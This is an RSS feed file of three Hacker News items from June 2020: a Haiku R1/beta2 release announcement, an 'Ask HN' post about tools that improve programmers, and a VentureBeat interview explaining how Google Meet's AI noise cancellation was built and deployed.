<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>Haiku R1/beta2 has been released</title>
<link>https://www.haiku-os.org/news/2020-06-09_haiku_r1_beta2/</link>
<guid isPermaLink="true" >https://www.haiku-os.org/news/2020-06-09_haiku_r1_beta2/</guid>
<description>&lt;a href=&quot;https://www.haiku-os.org/&quot;&gt;&lt;img src=&quot;https://www.haiku-os.org/images/haiku_logo_white.svg&quot; alt=&quot;Home&quot; id=&quot;logo&quot; height=&quot;100&quot;/&gt;&lt;/a&gt;&lt;nav class=&quot;navbar navbar-default&quot;&gt;
&lt;/nav&gt;&lt;div class=&quot;row&quot; id=&quot;main-front&quot;&gt;
&lt;div class=&quot;col-md-9 col-md-push-3&quot; readability=&quot;7.4704225352113&quot;&gt;
&lt;div class=&quot;node&quot; readability=&quot;11.864788732394&quot;&gt;


&lt;p&gt;After almost 2 years since R1/beta1, Haiku R1/beta2 has been released. See “&lt;a href=&quot;https://www.haiku-os.org/get-haiku/r1beta2/release-notes/&quot;&gt;Release Notes&lt;/a&gt;” for the release notes, “&lt;a href=&quot;https://www.haiku-os.org/get-haiku/r1beta2/release-notes/#press-contact&quot;&gt;Press contact&lt;/a&gt;&quot;, for press inquiries &amp;amp;mldr; and “&lt;a href=&quot;https://www.haiku-os.org/get-haiku/r1beta2/&quot;&gt;Get Haiku!&lt;/a&gt;” to skip all that and just download the release (or upgrade to it from an existing install!)&lt;/p&gt;
&lt;/div&gt;
&lt;br/&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;footer readability=&quot;4.2325581395349&quot;&gt;&lt;p&gt;© 2001-2020 Haiku, Inc. — Haiku® and the HAIKU logo® are registered trademarks of &lt;a href=&quot;http://www.haiku-inc.org&quot; target=&quot;_blank&quot;&gt;Haiku, Inc.&lt;/a&gt;&lt;/p&gt;
&lt;p class=&quot;last&quot;&gt;&lt;a href=&quot;https://www.haiku-os.org/index.xml&quot;&gt;Main feed&lt;/a&gt; | &lt;a href=&quot;https://www.haiku-os.org/blog/index.xml&quot;&gt;Blog-O-Sphere feed&lt;/a&gt;&lt;/p&gt;
&lt;/footer&gt;</description>
<pubDate>Tue, 09 Jun 2020 18:23:03 +0000</pubDate>
<dc:creator>waddlesplash</dc:creator>
<og:title>Haiku R1/beta2 has been released!</og:title>
<og:url>https://www.haiku-os.org/news/2020-06-09_haiku_r1_beta2/</og:url>
<og:type>article</og:type>
<og:description>After almost 2 years since R1/beta1, Haiku R1/beta2 has been released. See &amp;ldquo;Release Notes&amp;rdquo; for the release notes, &amp;ldquo;Press contact&amp;quot;, for press inquiries &amp;hellip; and &amp;ldquo;Get Haiku!&amp;rdquo; to skip all that and just download the …</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.haiku-os.org/news/2020-06-09_haiku_r1_beta2/</dc:identifier>
</item>
<item>
<title>Ask HN: Which tools have made you a much better programmer?</title>
<link>https://news.ycombinator.com/item?id=23468193</link>
<guid isPermaLink="true" >https://news.ycombinator.com/item?id=23468193</guid>
<description>&lt;tr readability=&quot;0.58823529411765&quot;&gt;&lt;td bgcolor=&quot;#FF6600&quot;&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr id=&quot;pagespace&quot; title=&quot;Ask HN: Which tools have made you a much better programmer?&quot;&gt;&lt;td/&gt;
&lt;/tr&gt;&lt;tr readability=&quot;8.1862745098039&quot;&gt;&lt;td&gt;
&lt;table class=&quot;fatitem&quot; border=&quot;0&quot; readability=&quot;5.7303921568627&quot;&gt;&lt;tr class=&quot;athing&quot; id=&quot;23468193&quot; readability=&quot;0&quot;&gt;&lt;td align=&quot;right&quot; valign=&quot;top&quot; class=&quot;title&quot;/&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;title&quot;&gt;&lt;a href=&quot;https://news.ycombinator.com/item?id=23468193&quot; class=&quot;storylink&quot;&gt;Ask HN: Which tools have made you a much better programmer?&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;0.73170731707317&quot;&gt;&lt;td colspan=&quot;2&quot;/&gt;
&lt;td class=&quot;subtext&quot;&gt;&lt;span class=&quot;score&quot; id=&quot;score_23468193&quot;&gt;252 points&lt;/span&gt; by &lt;a href=&quot;https://news.ycombinator.com/user?id=karamazov&quot; class=&quot;hnuser&quot;&gt;karamazov&lt;/a&gt; &lt;span class=&quot;age&quot;&gt;&lt;a href=&quot;https://news.ycombinator.com/item?id=23468193&quot;&gt;8 hours ago&lt;/a&gt;&lt;/span&gt; &lt;span id=&quot;unv_23468193&quot;/&gt; | &lt;a href=&quot;https://news.ycombinator.com/hide?id=23468193&amp;amp;goto=item%3Fid%3D23468193&quot;&gt;hide&lt;/a&gt; | &lt;a href=&quot;https://hn.algolia.com/?query=Ask%20HN%3A%20Which%20tools%20have%20made%20you%20a%20much%20better%20programmer%3F&amp;amp;sort=byDate&amp;amp;dateRange=all&amp;amp;type=story&amp;amp;storyText=false&amp;amp;prefix&amp;amp;page=0&quot; class=&quot;hnpast&quot;&gt;past&lt;/a&gt; | &lt;a href=&quot;https://www.google.com/search?q=Ask%20HN%3A%20Which%20tools%20have%20made%20you%20a%20much%20better%20programmer%3F&quot;&gt;web&lt;/a&gt; | &lt;a href=&quot;https://news.ycombinator.com/fave?id=23468193&amp;amp;auth=8e2a5ceed463c81e976516a1156b5c91b11de3dc&quot;&gt;favorite&lt;/a&gt; | &lt;a href=&quot;https://news.ycombinator.com/item?id=23468193&quot;&gt;364 comments&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td/&gt;
&lt;/tr&gt;&lt;tr readability=&quot;13&quot;&gt;&lt;td colspan=&quot;2&quot;/&gt;
&lt;td readability=&quot;9&quot;&gt;Getting better at coding is usually a long, slow process of study and practice. However, sometimes I run into something that's easy to understand and, once I'm using it, feels like I've leveled up.
&lt;p&gt;A few personal examples are: * version control - specifically, reading up on git and understanding the more complex commands * debuggers * flame graphs for performance debugging * good code search&lt;/p&gt;
&lt;p&gt;What have you added to your workflow that's made you much more productive?&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td/&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td colspan=&quot;2&quot;/&gt;
&lt;td&gt;

&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;1&quot;&gt;&lt;td&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;10&quot; width=&quot;0&quot;/&gt;&lt;br/&gt;&lt;center&gt;&lt;span class=&quot;yclinks&quot;&gt;&lt;a href=&quot;https://news.ycombinator.com/newsguidelines.html&quot;&gt;Guidelines&lt;/a&gt; | &lt;a href=&quot;https://news.ycombinator.com/newsfaq.html&quot;&gt;FAQ&lt;/a&gt; | &lt;a href=&quot;mailto:hn@ycombinator.com&quot;&gt;Support&lt;/a&gt; | &lt;a href=&quot;https://github.com/HackerNews/API&quot;&gt;API&lt;/a&gt; | &lt;a href=&quot;https://news.ycombinator.com/security.html&quot;&gt;Security&lt;/a&gt; | &lt;a href=&quot;https://news.ycombinator.com/lists&quot;&gt;Lists&lt;/a&gt; | &lt;a href=&quot;https://news.ycombinator.com/bookmarklet.html&quot; rel=&quot;nofollow&quot;&gt;Bookmarklet&lt;/a&gt; | &lt;a href=&quot;http://www.ycombinator.com/legal/&quot;&gt;Legal&lt;/a&gt; | &lt;a href=&quot;http://www.ycombinator.com/apply/&quot;&gt;Apply to YC&lt;/a&gt; | &lt;a href=&quot;mailto:hn@ycombinator.com&quot;&gt;Contact&lt;/a&gt;&lt;/span&gt;
&lt;/center&gt;
&lt;/td&gt;
&lt;/tr&gt;</description>
<pubDate>Tue, 09 Jun 2020 16:43:32 +0000</pubDate>
<dc:creator>karamazov</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://news.ycombinator.com/item?id=23468193</dc:identifier>
</item>
<item>
<title>How Google Meet&amp;#039;s noise cancellation works</title>
<link>https://venturebeat.com/2020/06/08/google-meet-noise-cancellation-ai-cloud-denoiser-g-suite/</link>
<guid isPermaLink="true" >https://venturebeat.com/2020/06/08/google-meet-noise-cancellation-ai-cloud-denoiser-g-suite/</guid>
<description>&lt;p&gt;Google is turning on AI-powered noise cancellation in Google Meet today. Like &lt;a href=&quot;https://venturebeat.com/2020/04/09/microsoft-teams-ai-machine-learning-real-time-noise-suppression-typing/&quot;&gt;Microsoft Teams’ upcoming noise suppression functionality&lt;/a&gt;, the feature leverages supervised learning, which entails training an AI model on a labeled data set. This is a gradual rollout, so if you are a G Suite customer, you may not get noise cancellation until later this month. Noise cancellation will hit the web first, with Android and iOS coming later.&lt;/p&gt;
&lt;p&gt;In April, Google &lt;a href=&quot;https://cloud.google.com/blog/products/productivity-collaboration/introducing-tiled-view-and-other-top-requested-features-in-google-meet&quot;&gt;announced&lt;/a&gt; that Meet’s noise cancellation feature was coming to G Suite Enterprise and G Suite Enterprise for Education customers. Here’s how the company described it: “To help limit interruptions to your meeting, Meet can now intelligently filter out background distractions — like your dog barking or keystrokes as you take meeting notes.” The “denoiser,” as its colloquially known, is on by default, though you can turn it off in Google Meet’s settings.&lt;/p&gt;
&lt;p&gt;The use of collaboration and video conferencing tools has exploded as the coronavirus crisis forces millions to learn and &lt;a href=&quot;https://venturebeat.com/2020/03/13/probeat-work-from-home-wfh-tips-remote-work-team/&quot;&gt;work from home&lt;/a&gt;. Google is one of many companies trying to &lt;a href=&quot;https://venturebeat.com/2020/04/29/google-meet-zoom-free-60-minutes-meetings/&quot;&gt;one-up Zoom&lt;/a&gt;, which saw its daily meeting participants soar from &lt;a href=&quot;https://venturebeat.com/2020/04/02/zooms-daily-active-users-jumped-from-10-million-to-over-200-million-in-3-months/&quot;&gt;10 million to over 200 million in three months&lt;/a&gt;. Google is positioning Meet, which has &lt;a href=&quot;https://venturebeat.com/2020/04/28/alphabet-earnings-q1-2020/&quot;&gt;100 million daily meeting participants&lt;/a&gt; as of April, as the G Suite alternative to Zoom for businesses and consumers alike.&lt;/p&gt;
&lt;p&gt;Serge Lachapelle, G Suite director of product management, has been working on video conferencing for 25 years, 13 of those at Google. As most of the company shifted to working from home, Lachapelle’s team got the go-ahead to deploy the denoiser in Google Meet meetings. We discussed how the project started, how his team built noise cancellation, the data required, the AI model, how the denoiser works, what noise it cancels out and what it doesn’t, privacy, and user experience considerations (there is no visual indication that the denoiser is on).&lt;/p&gt;
&lt;div id=&quot;boilerplate_2599266&quot; class=&quot;post-boilerplate boilerplate-speedbump&quot; readability=&quot;14.08&quot;&gt;&lt;a href=&quot;https://www.vbtransform.com/?utm_source=vbhouse&amp;amp;utm_medium=article%20&amp;amp;utm_content=TransformLanding&amp;amp;utm_term=InContent&amp;amp;utm_campaign=MayB&quot;&gt;VB Transform 2020 Online&lt;/a&gt; - July 15-17. Join leading AI executives: &lt;a href=&quot;https://www.eventbrite.com/e/venturebeat-transform-2020-accelerating-your-business-with-ai-tickets-70048863035?aff=MayB&quot;&gt;Register for the free livestream&lt;/a&gt;.&lt;/div&gt;
&lt;h2&gt;Starting in 2017&lt;/h2&gt;
&lt;p&gt;When Google rolls out big new features, it typically starts with a small percentage of users and then ramps up the rollout based on the results. Noise cancellation will be no different. “We plan on doing this gradually over the month of June,” Lachapelle said. “But we have been using it a lot within Google over the past year, actually.”&lt;/p&gt;
&lt;p&gt;The project goes back further than that, beginning with Google’s &lt;a href=&quot;https://venturebeat.com/2017/01/05/google-buys-limes-audio-to-fix-sound-quality-in-video-calls/&quot;&gt;acquisition of Limes Audio&lt;/a&gt; in January 2017. “With this acquisition, we got some amazing audio experts into our Stockholm office,” Lachapelle said.&lt;/p&gt;
&lt;p&gt;The original noise cancellation idea was born out of annoyances while conducting meetings across time zones.&lt;/p&gt;
&lt;p&gt;“It started off as a project from our conference rooms,” Lachapelle said. “I’m based out of Stockholm. When we meet with the U.S., it’s usually around this time [morning in the U.S., evening in Europe]. You’ll hear a lot of cling, cling, cling and weird little noises of people eating their breakfast or eating their dinners or taking late meetings at home and kids screaming and all. It was really that that triggered off this project about a year and a half ago.”&lt;/p&gt;
&lt;p&gt;The team did a lot of work finding the right data, building AI models, and addressing latency. But the biggest obstacle was forming the idea in the first place, followed by multiple simulations and evaluations.&lt;/p&gt;
&lt;p&gt;“It had never been done,” Lachapelle said. “At first, we thought we would require hardware for this, dedicated machine learning hardware chips. It was a very small project. Like how we do things at Google is usually things start very small. I venture a guess to say this started in the fall of 2018. It probably took a month or two or three to build a compelling prototype.”&lt;/p&gt;
&lt;p&gt;“And then you get the team excited around it,” he continued. “Then you get your leadership excited around it. Then you get it funded to start exploring this more in depth. And then you start bringing it into a product phase. Since a lot of this has never been done, it can take a year to get things rolled out. We started rolling it out to the company more broadly, I would say around December, January. When people started working at home, at Google, the use of it increased a lot. And then we got a good confirmation that ‘Wow, we’ve got something here. Let’s go.'”&lt;/p&gt;
&lt;h2&gt;Corpus data&lt;/h2&gt;
&lt;p&gt;Similar to speech recognition, which requires figuring out what is speech and what is not, this type of feature requires training a machine learning model to understand the difference between noise and speech, and then keep just the speech. At first, the team used thousands of its own meetings to train the model. “We’d say, ‘OK everyone, just so you know we’re recording this, and we’re going to submit it to start training the model.'” The company also relied on audio from YouTube videos “wherever there’s a lot of people talking. So either groups in the same room or back and forth.”&lt;/p&gt;
&lt;p&gt;“The algorithm was trained using a mixed data set featuring noise and clean speech,” Lachapelle said. Other Google employees, including from the Google Brain team and the Google Research team, also contributed, though not with audio from their meetings. “The algorithm was not trained on internal recordings, but instead employees submitted feedback extensively about their experiences, which allowed the team to optimize. It is important to say that this project stands on the shoulders of giants. Speech recognition and enhancement has been heavily invested in at Google over the years, and much of this work has been reused.”&lt;/p&gt;
&lt;p&gt;Nevertheless, a lot of manual validation was still required. “I’ve seen everything from engineers coming to work with maracas, guitars, and accordions to just normal YouTubers doing livestreaming and testing it out on that. The range has been pretty broad.”&lt;/p&gt;
&lt;h2&gt;The denoiser in action&lt;/h2&gt;
&lt;p&gt;The feature may be called “noise cancellation,” but that doesn’t mean it cancels all noise. First off, it’s difficult for everyone to agree on what sounds constitute noise. And even if most humans can agree that something is an unwanted noise in a meeting, it’s not easy to get an AI model to concur without overdoing it.&lt;/p&gt;
&lt;p&gt;“It works well on a door slamming,” Lachapelle said. “It works well on dogs barking; kids fighting, so-so. We’re taking a softer approach at first, or sometimes we’re not going to cancel everything because we don’t want to go overboard and start canceling things out that shouldn’t be canceled. Sometimes it’s good for you to hear that I’m taking a deep breath, or those more natural noises. So this is going to be a project that’s going to go on for many years as we tune it to become better and better and better.”&lt;/p&gt;
&lt;p&gt;On our call, Lachapelle demonstrated a few examples of the feature in action. He knocked a pen around inside a mug, tapped on a can, rustled a plastic bag, and even applauded. Then he did it all again after turning on the denoiser — it worked. You can watch him recreate similar noises (rustling a roasted nut bag, clicking a pen, hitting an Allen key in a glass, snapping a ruler, clapping) in the video up top.&lt;/p&gt;
&lt;p&gt;“The applause part was a kind of a strange moment because when we did our first demo of this to the whole team, people broke out in applause and it canceled out the applause,” Lachapelle said. “That’s when we understood, ‘Oh, we’re going to need to have a controller to turn this on and off in the settings because there’s probably going to be some use cases where you really don’t want your noise to be removed.'”&lt;/p&gt;
&lt;h3&gt;Vocal ranges&lt;/h3&gt;
&lt;p&gt;The line for what the denoiser does and doesn’t cancel out is blurry. It’s not as simple as detecting human voices and negating everything else.&lt;/p&gt;
&lt;p&gt;“The human voice has such a large range,” Lachapelle said. “I would say screaming is a tough one. This is a human voice, but it’s noise. Dogs at certain pitches, that’s also very hard. So some of it sometimes will slip through. On those kinds of things, it’s still a work in progress.”&lt;/p&gt;
&lt;p&gt;“Things like vacuum cleaners, we’ve got down really well,” he continued. “I had a big customer meeting the other day with Christina, who’s in Zurich — she leads our support team. And so we were talking with this customer, and all of a sudden I see in the back, her Roomba starts rolling into the room and gets stuck under her desk. She was there trying to talk to the customer and getting rid of the Roomba, and we never heard the Roomba go. It was completely silent. I thought that was kind of the ultimate test. If we can get those kinds of things out — drills, people that have construction next door, people that are sitting in the kitchen and they’ve got the blender going — those kinds of things it’s really, really good at.”&lt;/p&gt;
&lt;p&gt;A musical instrument will probably also get filtered out. “To a pretty large degree, it does,” Lachapelle said. “Especially percussion instruments. Sometimes a guitar can sound very much like a voice — you’re starting to touch the limits there. But if you have music playing in the background, usually it’ll cut it all out.”&lt;/p&gt;
&lt;p&gt;What about laughter? “I’ve never heard it block laughter.”&lt;/p&gt;
&lt;p&gt;What about singing? “Singing works.”&lt;/p&gt;
&lt;p&gt;Singing goes through, but the musical instruments don’t, “especially if they’re in the background.”&lt;/p&gt;
&lt;p&gt;Crucially, Google Meet’s noise cancellation is being rolled out for all languages. That might seem obvious at first, but Lachapelle said the team discovered it was “super important” to test the system on multiple languages.&lt;/p&gt;
&lt;p&gt;“When we speak English, there’s a certain range of voice we use,” Lachapelle said. “There’s a certain way of delivering the consonants and the vowels compared to other languages. So those are big considerations. We did a lot of validation across different languages. We tested this a lot.”&lt;/p&gt;
&lt;h3&gt;Proximity and amplitude&lt;/h3&gt;
&lt;p&gt;Another challenge was dealing with proximity. This is not a machine learning problem — it’s a “too much noise too close to the microphone” problem.&lt;/p&gt;
&lt;p&gt;“Keyboard typing is tricky,” Lachapelle said. “It’s like a step function in the audio signal. Especially if the keyboard is close to the microphone, that bang of the key right next to the microphone means that we can’t get voice out of the microphone because the microphone got saturated by the keyboard. So there are cases where if I’m overloading the microphone, my voice can’t get through. It becomes more or less impossible.”&lt;/p&gt;
&lt;p&gt;The team factored in distance from the microphone when determining what to filter out. The model thus adapts for amplitude. On our call, Lachapelle played some music from his iPhone. When he put his phone’s speakers right next to the microphone, we could hear the music come through a little bit while his voice, which was coming from further away, distorted a bit. Google Meet did not cancel out the music completely — it was more muffled. When he turned off the denoiser, the music came through at full volume.&lt;/p&gt;
&lt;p&gt;“That’s when you see it find that threshold that we were talking about,” Lachapelle said. “You don’t want to have false positives, so we will err on the side of safety. It’s better to let something go through than to block something that really should go through. That’s what we’re going to start tuning now, once we start releasing this to more and more users. We’ll be able to get a lot of feedback on it. Someone out there is going to have a scenario we didn’t think of, and we’ll have to take that into consideration and further the model.”&lt;/p&gt;
&lt;h2&gt;Tuning&lt;/h2&gt;
&lt;p&gt;Tuning the AI model is going to be difficult, given all the different types of noise it encompasses. But the end goal isn’t to get the model to cancel out background noise completely. Nor is it making sure that all types of laughter can get through 100%.&lt;/p&gt;
&lt;p&gt;“The goal is to make the conversation better,” Lachapelle said. “So the goal is the intelligibility of what you and I are saying — absolutely. And if the music is playing in the background and we can’t cancel it all out, as long as you and I can have a better conversation with it turned on, then it’s a win. So it’s always about you and I being able to understand each other better.”&lt;/p&gt;
&lt;p&gt;Making the conversation more coherent is particularly important in the era of smartphones and people working on the go.&lt;/p&gt;
&lt;p&gt;“We have a big chunk of users now that are using mobiles, and we’ve never seen this much mobile usage, percentage-wise,” Lachapelle said. “I know we all talk about billions of minutes and so on going on in the system. But of that big chunk, the percentage of mobile users has never been this high. And mobile users are usually in very noisy environments. So for that use case, it’s going to have a huge impact. Here I’m sitting in my little office in Sweden with my fancy mic and my good headphones, probably not what we designed this for. We designed this for noisy environments because people need to talk wherever they are.”&lt;/p&gt;
&lt;h2&gt;Privacy&lt;/h2&gt;
&lt;p&gt;When you’re on a Google Meet call, your voice is sent from your device to a Google datacenter, where it goes through the machine learning model on the &lt;a href=&quot;https://venturebeat.com/2019/05/07/google-cloud-makes-1000-tpu-chip-pods-available-in-public-beta/&quot;&gt;TPU&lt;/a&gt;, gets reencrypted, and is then sent back to the meeting. (Media is always encrypted during transport, even when moving within Google’s own networks, computers, and datacenters. There are two exceptions: when you call in on a traditional phone, and when a meeting is recorded.)&lt;/p&gt;
&lt;p&gt;“In the case of denoising, the data is read by the denoiser using the key that is shared between all the participants, denoised, and then sent off using the same key,” Lachapelle said. “This is done in a secure service (we call this borg) in our datacenter, and the data is never accessible outside the denoiser process, in order to ensure privacy, confidentiality, and safety. We’re still working on the plumbing in our infrastructure to connect the people that dial in with a phone normally. But that’s going to come a little bit later because they are a very noisy bunch.”&lt;/p&gt;
&lt;p&gt;Lachapelle emphasized repeatedly that Google will be improving the feature over time, but not directly using external meetings. Recorded meetings will not be used to train the AI either.&lt;/p&gt;
&lt;p&gt;“We don’t look at anything that’s going on in the meetings, unless you decide to record a meeting,” Lachapelle said. “Then, of course, we take the meeting and we put it to Google Drive. So the way we’re going to work is through our customer channels and support and so on and trying to identify cases where things did not work as predicted. Internally at Google, there are meetings that are recorded, and if someone identifies a problem that happened, then hopefully they’ll send it to the team. But we don’t look at recordings for this purpose, unless someone sends us the file manually.”&lt;/p&gt;
&lt;h2&gt;User experience considerations&lt;/h2&gt;
&lt;p&gt;If you’re a G Suite enterprise customer, when Google flips the switch for you this month Meet’s noise cancellation feature will be on by default. You will have to turn it off in settings when you want “noise” to come through. On the web, you’ll click the three dots at the bottom right, then Settings. Under the Audio tab, between microphone and speakers, you’ll see an extra switch that you can turn on or off. It’s labeled “Noise cancellation: Filters out sound that isn’t speech.”&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-full wp-image-2608954 jetpack-lazy-image&quot; src=&quot;https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;is-pending-load=1#038;strip=all&quot; alt=&quot;Google Meet audio settings with noise cancellation&quot; width=&quot;1024&quot; height=&quot;895&quot; data-recalc-dims=&quot;1&quot; data-lazy-srcset=&quot;https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;strip=all?w=1082&amp;amp;strip=all 1082w, https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;strip=all?w=300&amp;amp;strip=all 300w, https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;strip=all?w=768&amp;amp;strip=all 768w, https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;strip=all?w=686&amp;amp;strip=all 686w, https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;strip=all?w=160&amp;amp;strip=all 160w, https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;strip=all?w=400&amp;amp;strip=all 400w, https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;strip=all?w=780&amp;amp;strip=all 780w, https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;strip=all?w=578&amp;amp;strip=all 578w, https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;strip=all?w=930&amp;amp;strip=all 930w&quot; data-lazy-sizes=&quot;(max-width: 1000px) 100vw, 1000px&quot; srcset=&quot;data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7&quot;/&gt;&lt;/p&gt;&lt;noscript&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-full wp-image-2608954&quot; src=&quot;https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;strip=all&quot; alt=&quot;Google Meet audio settings with noise cancellation&quot; width=&quot;1024&quot; height=&quot;895&quot; srcset=&quot;https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;strip=all?w=1082&amp;amp;strip=all 1082w, https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;strip=all?w=300&amp;amp;strip=all 300w, https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;strip=all?w=768&amp;amp;strip=all 768w, https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;strip=all?w=686&amp;amp;strip=all 686w, https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;strip=all?w=160&amp;amp;strip=all 160w, https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;strip=all?w=400&amp;amp;strip=all 400w, https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;strip=all?w=780&amp;amp;strip=all 780w, https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;strip=all?w=578&amp;amp;strip=all 578w, https://venturebeat.com/wp-content/uploads/2020/06/google-meet-audio-settings-noise-cancellation-2020.png?resize=1024%2C895&amp;amp;strip=all?w=930&amp;amp;strip=all 930w&quot; sizes=&quot;(max-width: 1000px) 100vw, 1000px&quot; data-recalc-dims=&quot;1&quot;/&gt;&lt;/p&gt;
&lt;/noscript&gt;
&lt;p&gt;Google decided to put this switch in settings, as opposed to somewhere visible during a call. And there is no visual indication that noise is being canceled out. This means noise will be canceled out on calls and people won’t even be aware it’s happening, let alone that the feature exists. We asked Lachapelle why those decisions were made.&lt;/p&gt;
&lt;p&gt;“There’s some people that would perhaps want us to show like ‘Look at how good we are. Right now your noise is being filtered out.’ I guess you could bring it down to user interface considerations,” Lachapelle said. “We’ve done a lot of user testing and interviews of users. We had users in labs last year before confinement, where we tested different models on them. And that combined with — you can see Meet doesn’t have buttons all over the place, it’s a fairly clean UX. Basically, my answer to your question would be, it’s based on the user research we’ve done, and on trying to keep the interface of Meet as clean as possible.”&lt;/p&gt;
&lt;h3&gt;Who controls the noise cancellation?&lt;/h3&gt;
&lt;p&gt;On a typical Google Meet call, you can mute yourself and — depending on the settings — mute others. But Google chose to not let users noise-cancel others. The noise cancellation occurs on the sender’s side — where the noise originates — so that’s where the switch is. While that might make sense in most cases, it means the receiver cannot control noise cancellation for what they hear. The team made that decision deliberately, but it wasn’t an easy one.&lt;/p&gt;
&lt;p&gt;“I don’t think the off switch is going to be used much at all,” Lachapelle said. “So putting it front and center might be sort of overloading it. This should just be magic and work in the background. But like again, your ideas are spot on. This is exactly what we’ve been talking about. We’ve been testing. So it really shows that you’ve done a lot of homework on this. Because these are the challenges. And I don’t think any of us is 100% sure that this is the right way. Let’s see how it goes.”&lt;/p&gt;
&lt;p&gt;If it doesn’t work out, that’s OK. Google has already done the majority of the work. Moving switches around — “I don’t want to say that it’s simple, but it’s simpler than changing the whole machine learning model.” We asked whether alternative solutions could mean having the switch on the receiving end, or even on both ends.&lt;/p&gt;
&lt;p&gt;“So we’ll try with this, and we might want to move to what you’re describing, as we get this into the hands of more and more users,” Lachapelle said. “By no means is this work done. This is going to be work that’s going to go on for a while. Also, we’re going to learn a lot of things. Like what controls are the best for the users. How do you make users understand that this is going on? Do they need to understand that this is going on? We think we have an idea of how to get the first step, but beyond that it’ll be a journey with all of our users.”&lt;/p&gt;
&lt;p&gt;If the current solution doesn’t work, Lachapelle said the team will probably build a few prototypes, do some more user research, and test them out via G Suite’s alpha program.&lt;/p&gt;
&lt;h2&gt;Cloud versus edge&lt;/h2&gt;
&lt;p&gt;Google also made a conscious decision to put the machine learning model in the cloud, which wasn’t the immediately obvious choice.&lt;/p&gt;
&lt;p&gt;“There’s a lot of ways to apply these models,” Lachapelle said. “Some require much beefier endpoints — you need a good computer. You’ve seen some of the stuff that that has been released, some of it as an extension or some of it requires a more powerful graphics card. We didn’t want to go that way. We wanted to make sure that access to this would be possible on your phones, no matter what phone you have, on your laptops. Laptops are getting thinner — they don’t have fans anymore. Loading them too hard with CPU isn’t a good idea. So we decided to see if we could do this in the cloud.”&lt;/p&gt;
&lt;p&gt;Using the cloud simply wasn’t feasible before.&lt;/p&gt;
